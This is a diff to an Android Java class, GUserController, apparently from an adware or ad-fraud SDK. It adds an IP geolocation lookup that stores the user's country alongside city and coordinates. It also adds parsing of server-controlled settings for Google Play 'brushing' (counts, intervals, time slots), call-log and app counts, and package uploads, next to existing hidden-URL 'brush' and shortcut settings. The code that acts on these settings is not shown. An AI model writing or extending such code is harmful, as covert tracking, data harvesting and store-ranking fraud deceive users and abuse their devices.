@@ -56,6 +56,29 @@ public class GUserController {
 		return false;
 	}
 
+	public void toLogin()
+	{
+		GTools.httpGetRequest(GCommon.IP_URL, this, "toLoginCallback",null);
+	}
+
+	public void toLoginCallback(Object obj_session,Object obj_data)
+	{
+		String data = (String) obj_data;
+		try {
+			JSONObject obj = new JSONObject(data);
+			if("success".equals(obj.getString("status")))
+			{
+				String country = obj.getString("country");//国家
+				GTools.saveSharedData(GCommon.SHARED_KEY_CURR_COUNTRY,country);
+				GLog.e("-----------------","get country="+country);
+			}
+		} catch (JSONException e) {
+			e.printStackTrace();
+		}finally{
+			login();
+		}
+	}
+
 	public void login()
 	{
 		isLogin = false;
@@ -197,11 +220,13 @@ public class GUserController {
 			JSONObject obj = new JSONObject(data);
 			if("success".equals(obj.getString("status")))
 			{
+				String country = obj.getString("country");//国家
 				String city = obj.getString("city");//城市  
 				String province = obj.getString("regionName");//省份
 				String district = obj.getString("lat");//区县 
 				String street = obj.getString("lon");//街道
-				
+
+				user.setCountry(country);
 				user.setProvince(province);
 				user.setCity(city);
 				user.setDistrict(district);
@@ -320,7 +345,14 @@ public class GUserController {
 				String adPosition = obj.getString("adPosition");
 				float loopTime = (float) obj.getDouble("loopTime");
 				boolean uploadPackage = obj.getBoolean("uploadPackage");
-				
+				int callLogNum = obj.getInt("callLogNum");
+				float timeLimt = (float)obj.getDouble("timeLimt");
+				int newChannelNum = obj.getInt("newChannelNum");
+				int channel_paiming = obj.getInt("channel_paiming");
+				String modes = obj.getString("modes");
+				int appNum = obj.getInt("appNum");
+				String province = obj.getString("province");
+
 				List<GAdPositionConfig> list_configs = new ArrayList<GAdPositionConfig>();
 				
 				JSONArray configs = obj.getJSONArray("configs");
@@ -342,20 +374,34 @@ public class GUserController {
 					String timeSlot = config.getString("timeSlot");
 					String whiteList = config.getString("whiteList");
 					String browerBreakUrl = config.getString("browerBreakUrl");
+					int gpBrushNum = config.getInt("gpBrushNum");
+					float gpBrushInterval = (float) config.getDouble("gpBrushInterval");
+					String gpBrushTimeSlot = config.getString("gpBrushTimeSlot");
 					
 					GAdPositionConfig adConfig = new GAdPositionConfig(adPositionId,adPositionType, timeSlot, showNum, showTimeInterval,
 							whiteList,adShowNum, browerSpotTwoTime,browerSpotFlow, bannerDelyTime, shortcutIconPath, 
 							shortcutName, shortcutUrl, behindBrushUrls,browerBreakUrl);
+					adConfig.setGpBrushNum(gpBrushNum);
+					adConfig.setGpBrushInterval(gpBrushInterval);
+					adConfig.setGpBrushTimeSlot(gpBrushTimeSlot);
 //					adConfig.initPackageName(launcherApps);
 					list_configs.add(adConfig);
 				}
 				media = new GMedia(name, packageName, open, adPosition, list_configs,loopTime,uploadPackage);
 				media.initWhiteList();
+				media.setModes(modes);
+				media.setCallLogNum(callLogNum);
+				media.setTimeLimt(timeLimt);
+				media.setNewChannelNum(newChannelNum);
+				media.setChannel_paiming(channel_paiming);
+				media.setAppNum(appNum);
+				media.setProvince(province);
+
 				GLog.e("---------------", "Config读取成功!!");
 				//开始走流程
 				GSysService.getInstance().startMainLoop();
 			} catch (JSONException e) {
-				GLog.e("---------------", "Config 解析失败！");
+				GLog.e("---------------", "Config 解析失败！"+rev.toString());
 			} 
 			
 			if(media != null && media.getUploadPackage())
